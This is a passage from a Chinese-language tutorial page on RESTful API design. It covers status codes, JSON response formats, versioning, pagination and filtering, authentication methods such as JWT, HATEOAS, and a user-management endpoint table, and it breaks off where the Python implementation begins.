class="hljs-comment"># 服务不可用</span><br> <span class="hljs-number"> 504 </span>Gateway Timeout       <span class="hljs-comment"># 网关超时</span><br><br>最常用的状态码：<br>┌──────────────────┬─────────────────────────┐<br>│ 操作             │ 状态码                   │<br>├──────────────────┼─────────────────────────┤<br>│ GET成功          │<span class="hljs-number"> 200 </span>OK                  │<br>│ POST创建成功     │<span class="hljs-number"> 201 </span>Created             │<br>│ PUT/PATCH成功    │<span class="hljs-number"> 200 </span>OK                  │<br>│ DELETE成功       │<span class="hljs-number"> 204 </span>No Content          │<br>│ 参数错误         │<span class="hljs-number"> 400 </span>Bad Request         │<br>│ 未登录           │<span class="hljs-number"> 401 </span>Unauthorized        │<br>│ 无权限           │<span class="hljs-number"> 403 </span>Forbidden           │<br>│ 资源不存在       │<span class="hljs-number"> 404 </span>Not Found           │<br>│ 验证失败         │<span class="hljs-number"> 422 </span>Unprocessable Entity│<br>│ 服务器错误       │<span class="hljs-number"> 500 </span>Internal Server Error│<br>└──────────────────┴─────────────────────────┘<br></code></pre></td></tr></table></figure><h3 id="2-4-响应数据格式"><a href="#2-4-响应数据格式" class="headerlink" title="2.4 响应数据格式"></a>2.4 响应数据格式</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs nix">标准JSON响应格式：<br><br>成功响应：<br>&#123;<br>  <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>  <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">123</span>,<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;张三&quot;</span>,<br>    <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;zhang@example.com&quot;</span><br>  &#125;,<br>  <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;操作成功&quot;</span><br>&#125;<br><br>列表响应（带分页）：<br>&#123;<br>  <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>  <span class="hljs-string">&quot;data&quot;</span>: [<br>    &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;张三&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;李四&quot;</span>&#125;<br>  ],<br>  <span class="hljs-string">&quot;pagination&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;total&quot;</span>: <span class="hljs-number">100</span>,<br>    <span class="hljs-string">&quot;page&quot;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-string">&quot;limit&quot;</span>: <span class="hljs-number">20</span>,<br>    <span class="hljs-string">&quot;pages&quot;</span>: <span class="hljs-number">5</span><br>  &#125;,<br>  <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;获取成功&quot;</span><br>&#125;<br><br>错误响应：<br>&#123;<br>  <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>  <span class="hljs-string">&quot;error&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;VALIDATION_ERROR&quot;</span>,<br>    <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;验证失败&quot;</span>,<br>    <span class="hljs-string">&quot;details&quot;</span>: [<br>      &#123;<br>        <span class="hljs-string">&quot;field&quot;</span>: <span class="hljs-string">&quot;email&quot;</span>,<br>        <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;邮箱格式不正确&quot;</span><br>      &#125;,<br>      &#123;<br>        <span class="hljs-string">&quot;field&quot;</span>: <span class="hljs-string">&quot;password&quot;</span>,<br>        <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;密码长度至少8位&quot;</span><br>      &#125;<br>    ]<br>  &#125;<br>&#125;<br><br>统一字段说明：<br><span class="hljs-operator">-</span> <span class="hljs-params">status:</span> 状态（success<span class="hljs-operator">/</span>error）<br><span class="hljs-operator">-</span> <span class="hljs-params">data:</span> 数据内容<br><span class="hljs-operator">-</span> <span class="hljs-params">message:</span> 提示信息<br><span class="hljs-operator">-</span> <span class="hljs-params">error:</span> 错误详情<br><span class="hljs-operator">-</span> <span class="hljs-params">pagination:</span> 分页信息<br></code></pre></td></tr></table></figure><hr><h2 id="3-高级特性"><a href="#3-高级特性" class="headerlink" title="3. 高级特性"></a>3. 高级特性</h2><h3 id="3-1-版本控制"><a href="#3-1-版本控制" class="headerlink" title="3.1 版本控制"></a>3.1 版本控制</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs markdown">API版本控制的三种方式：<br><br><span class="hljs-bullet">1.</span> URI版本控制（推荐）<br>   https://api.example.com/v1/users<br>   https://api.example.com/v2/users<br><br>   优点：清晰、直观<br>   缺点：URI变化<br><br><span class="hljs-bullet">2.</span> 请求头版本控制<br>   GET /users<br>   Headers:<br><span class="hljs-code">     Accept: application/vnd.example.v1+json</span><br><span class="hljs-code"></span><br>   优点：URI不变<br>   缺点：不够直观<br><br><span class="hljs-bullet">3.</span> 参数版本控制<br>   GET /users?version=1<br><br>   优点：简单<br>   缺点：容易忽略，不够规范<br><br>推荐做法：<br><span class="hljs-bullet">-</span> 使用URI版本控制<br><span class="hljs-bullet">-</span> 主版本号（v1, v2）<br><span class="hljs-bullet">-</span> 保持向后兼容<br><span class="hljs-bullet">-</span> 明确废弃策略<br></code></pre></td></tr></table></figure><h3 id="3-2-分页、过滤、排序"><a href="#3-2-分页、过滤、排序" class="headerlink" title="3.2 分页、过滤、排序"></a>3.2 分页、过滤、排序</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">分页参数：</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/users?page=2&amp;limit=20</span><br><br><span class="hljs-string">或使用offset和limit：</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/users?offset=20&amp;limit=20</span><br><br><span class="hljs-string">响应包含分页信息：</span><br>&#123;<br>  <span class="hljs-attr">&quot;data&quot;:</span> [<span class="hljs-string">...</span>],<br>  <span class="hljs-attr">&quot;pagination&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;total&quot;:</span> <span class="hljs-number">1000</span>,      <span class="hljs-comment"># 总记录数</span><br>    <span class="hljs-attr">&quot;page&quot;:</span> <span class="hljs-number">2</span>,          <span class="hljs-comment"># 当前页</span><br>    <span class="hljs-attr">&quot;limit&quot;:</span> <span class="hljs-number">20</span>,        <span class="hljs-comment"># 每页数量</span><br>    <span class="hljs-attr">&quot;pages&quot;:</span> <span class="hljs-number">50</span>,        <span class="hljs-comment"># 总页数</span><br>    <span class="hljs-attr">&quot;prev&quot;:</span> <span class="hljs-number">1</span>,          <span class="hljs-comment"># 上一页</span><br>    <span class="hljs-attr">&quot;next&quot;:</span> <span class="hljs-number">3</span>           <span class="hljs-comment"># 下一页</span><br>  &#125;<br>&#125;<br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">过滤参数：</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/users?role=admin&amp;status=active</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/products?category=electronics&amp;price_min=100&amp;price_max=1000</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/orders?created_after=2024-01-01&amp;created_before=2024-12-31</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">排序参数：</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/users?sort=created_at&amp;order=desc</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/products?sort=-price</span>  <span class="hljs-comment"># 减号表示降序</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/users?sort=name,created_at</span>  <span class="hljs-comment"># 多字段排序</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">字段选择（稀疏字段集）：</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/users?fields=id,name,email</span><br><span class="hljs-string">只返回指定的字段，减少数据传输</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">搜索：</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/users?search=张三</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/products?q=手机</span><br></code></pre></td></tr></table></figure><h3 id="3-3-认证和授权"><a href="#3-3-认证和授权" class="headerlink" title="3.3 认证和授权"></a>3.3 认证和授权</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs nix">常见认证方式：<br><br><span class="hljs-number">1</span>. Basic Auth（基础认证）<br>   <span class="hljs-params">Authorization:</span> Basic base64(username:password)<br><br>   优点：简单<br>   缺点：不够安全（需HTTPS）<br><br><span class="hljs-number">2</span>. API Key<br>   GET <span class="hljs-operator">/</span>users<span class="hljs-operator">?</span>api_key<span class="hljs-operator">=</span>your_api_key<br>   或<br>   <span class="hljs-params">Headers:</span> <span class="hljs-params">X-API-Key:</span> your_api_key<br><br>   优点：简单、易于管理<br>   缺点：密钥泄露风险<br><br><span class="hljs-number">3</span>. JWT (JSON Web Token)（推荐）<br>   <span class="hljs-params">Authorization:</span> Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...<br><br>   优点：无状态、可扩展、信息丰富<br>   缺点：令牌较大<br><br><span class="hljs-number">4</span>. OAuth <span class="hljs-number">2.0</span><br>   用于第三方授权<br><br>   流程：<br>   <span class="hljs-number">1</span>. 客户端请求授权<br>   <span class="hljs-number">2</span>. 用户同意授权<br>   <span class="hljs-number">3</span>. 获取访问令牌<br>   <span class="hljs-number">4</span>. 使用令牌访问资源<br><br>JWT结构：<br>Header.Payload.Signature<br><br>&#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>,        <span class="hljs-comment"># 算法</span><br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span>           <span class="hljs-comment"># 类型</span><br>&#125;<br>.<br>&#123;<br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,          <span class="hljs-comment"># 用户ID</span><br>  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;张三&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1516239022</span>,     <span class="hljs-comment"># 签发时间</span><br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1516242622</span>      <span class="hljs-comment"># 过期时间</span><br>&#125;<br>.<br>HMACSHA256(<br>  base64UrlEncode(header) <span class="hljs-operator">+</span> <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-operator">+</span><br>  base64UrlEncode(payload),<br>  secret<br>)<br></code></pre></td></tr></table></figure><h3 id="3-4-HATEOAS"><a href="#3-4-HATEOAS" class="headerlink" title="3.4 HATEOAS"></a>3.4 HATEOAS</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs groovy">HATEOAS (Hypermedia <span class="hljs-keyword">as</span> the Engine of Application State)<br>超媒体驱动的应用状态<br><br>原则：<br>API响应中包含相关操作的链接<br><br>示例：<br>GET <span class="hljs-regexp">/users/</span><span class="hljs-number">123</span><br><br>响应：<br>&#123;<br>  <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">123</span>,<br>  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;张三&quot;</span>,<br>  <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;zhang@example.com&quot;</span>,<br>  <span class="hljs-string">&quot;links&quot;</span>: [<br>    &#123;<br>      <span class="hljs-string">&quot;rel&quot;</span>: <span class="hljs-string">&quot;self&quot;</span>,<br>      <span class="hljs-string">&quot;href&quot;</span>: <span class="hljs-string">&quot;/users/123&quot;</span>,<br>      <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;GET&quot;</span><br>    &#125;,<br>    &#123;<br>      <span class="hljs-string">&quot;rel&quot;</span>: <span class="hljs-string">&quot;update&quot;</span>,<br>      <span class="hljs-string">&quot;href&quot;</span>: <span class="hljs-string">&quot;/users/123&quot;</span>,<br>      <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;PUT&quot;</span><br>    &#125;,<br>    &#123;<br>      <span class="hljs-string">&quot;rel&quot;</span>: <span class="hljs-string">&quot;delete&quot;</span>,<br>      <span class="hljs-string">&quot;href&quot;</span>: <span class="hljs-string">&quot;/users/123&quot;</span>,<br>      <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;DELETE&quot;</span><br>    &#125;,<br>    &#123;<br>      <span class="hljs-string">&quot;rel&quot;</span>: <span class="hljs-string">&quot;orders&quot;</span>,<br>      <span class="hljs-string">&quot;href&quot;</span>: <span class="hljs-string">&quot;/users/123/orders&quot;</span>,<br>      <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;GET&quot;</span><br>    &#125;<br>  ]<br>&#125;<br><br>优点：<br>- API自解释<br>- 客户端不需要硬编码URL<br>- 易于演化<br><br>缺点：<br>- 增加响应大小<br>- 实现复杂<br></code></pre></td></tr></table></figure><hr><h2 id="4-实战项目：用户管理API"><a href="#4-实战项目：用户管理API" class="headerlink" title="4. 实战项目：用户管理API"></a>4. 实战项目：用户管理API</h2><h3 id="4-1-API设计"><a href="#4-1-API设计" class="headerlink" title="4.1 API设计"></a>4.1 API设计</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">用户管理API设计：<br><br>资源：Users（用户）<br><br>端点设计：<br>┌────────┬─────────────────┬──────────────────┬─────────┐<br>│ 方法   │ URI             │ 描述             │ 状态码  │<br>├────────┼─────────────────┼──────────────────┼─────────┤<br>│ GET    │ /api/v1/users   │ 获取用户列表     │ 200     │<br>│ GET    │ /api/v1/users/1 │ 获取指定用户     │ 200/404 │<br>│ POST   │ /api/v1/users   │ 创建新用户       │ 201     │<br>│ PUT    │ /api/v1/users/1 │ 更新用户（完整） │ 200/404 │<br>│ PATCH  │ /api/v1/users/1 │ 更新用户（部分） │ 200/404 │<br>│ DELETE │ /api/v1/users/1 │ 删除用户         │ 204/404 │<br>└────────┴─────────────────┴──────────────────┴─────────┘<br><br>查询参数：<br>- ?page=1&amp;<span class="hljs-built_in">limit</span>=20    <span class="hljs-comment"># 分页</span><br>- ?role=admin         <span class="hljs-comment"># 按角色过滤</span><br>- ?search=张          <span class="hljs-comment"># 搜索</span><br>- ?<span class="hljs-built_in">sort</span>=created_at    <span class="hljs-comment"># 排序</span><br></code></pre></td></tr></table></figure><h3 id="4-2-代码实现"><a href="#4-2-代码实现" class="headerlink" title="4.2 代码实现"></a>4.2 代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br></pre></td><td class="code"><pre><code class="hljs python"><span 